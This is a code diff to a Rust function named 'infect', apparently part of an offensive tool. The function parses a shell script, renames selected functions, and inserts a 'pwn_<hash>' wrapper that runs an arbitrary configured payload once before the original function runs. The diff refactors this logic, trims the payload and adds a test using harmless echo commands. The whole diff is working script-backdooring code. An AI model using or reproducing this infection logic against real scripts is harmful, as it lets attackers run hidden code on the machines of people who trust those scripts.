@@ -70,40 +70,44 @@ pub async fn infect<W: AsyncWrite + Unpin>(
 
     let hash = hash_script(script);
 
-    let parsed: syntax::List = script
-        .parse()
-        .map_err(|err| anyhow!("Failed to parse input as shell script: {:#?}", err))?;
+    let mut patches = {
+        let parsed: syntax::List = script
+            .parse()
+            .map_err(|err| anyhow!("Failed to parse input as shell script: {:#?}", err))?;
 
-    let mut patches = Vec::new();
+        let mut patches = Vec::new();
 
-    for item in &parsed.0 {
-        for cmd in &item.and_or.first.commands {
-            if let syntax::Command::Function(fun) = cmd.as_ref() {
-                let name = fun.name.to_string();
-                if config.should_hook_fn(&name) {
-                    let patched_name = format!("{}_{}", name, hash);
-                    let position = &fun.name.location.range;
-                    let code = fun.body.to_string();
+        for item in &parsed.0 {
+            for cmd in &item.and_or.first.commands {
+                if let syntax::Command::Function(fun) = cmd.as_ref() {
+                    let name = fun.name.to_string();
+                    if config.should_hook_fn(&name) {
+                        let patched_name = format!("{}_{}", name, hash);
+                        let position = &fun.name.location.range;
+                        let code = fun.body.to_string();
 
-                    let truncated = truncate(&code, 120);
-                    let is_truncated = truncated.len() != code.len();
+                        let truncated = truncate(&code, 120);
+                        let is_truncated = truncated.len() != code.len();
 
-                    debug!(
-                        "Found function {:?} at {:?}: {:?}{}",
-                        name,
-                        position,
-                        truncated,
-                        if is_truncated { " (truncated)" } else { "" }
-                    );
-                    patches.push(Patch::Rename {
-                        old: name,
-                        new: patched_name,
-                        position: position.clone(),
-                    });
+                        debug!(
+                            "Found function {:?} at {:?}: {:?}{}",
+                            name,
+                            position,
+                            truncated,
+                            if is_truncated { " (truncated)" } else { "" }
+                        );
+                        patches.push(Patch::Rename {
+                            old: name,
+                            new: patched_name,
+                            position: position.clone(),
+                        });
+                    }
                 }
             }
         }
-    }
+
+        patches
+    };
 
     debug!("Sorting generated patches...");
     patches.sort_by_key(|a| a.position().start);
@@ -135,7 +139,7 @@ pub async fn infect<W: AsyncWrite + Unpin>(
                     out.write_all(
                         format!(
                         "pwn_{hash}() {{ test -n \"${{pwned_{hash}:-}}\" && return; pwned_{hash}=1; {}; }}\n",
-                        config.payload,
+                        config.payload.trim(),
                         hash = hash,
                     )
                         .as_bytes(),
@@ -205,6 +209,26 @@ foo_552c23d59a98() {
 echo 2
 foo
 "
+        );
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn test_handle_payload_newlines() -> Result<()> {
+        let mut buf = Vec::new();
+        infect(
+            &Infect {
+                payload: "\n\necho 1\n\necho 2\n\n".to_string(),
+                hook_functions: vec!["foo".to_string()],
+            },
+            b"foo(){ :; }",
+            &mut buf,
+        )
+        .await?;
+        let script = String::from_utf8(buf)?;
+        assert_eq!(
+            script,
+            "pwn_4e75506456c7() { test -n \"${pwned_4e75506456c7:-}\" && return; pwned_4e75506456c7=1; echo 1\n\necho 2; }\nfoo() { pwn_4e75506456c7; foo_4e75506456c7 \"$@\"; }\nfoo_4e75506456c7(){ :; }",
         );
         Ok(())
     }
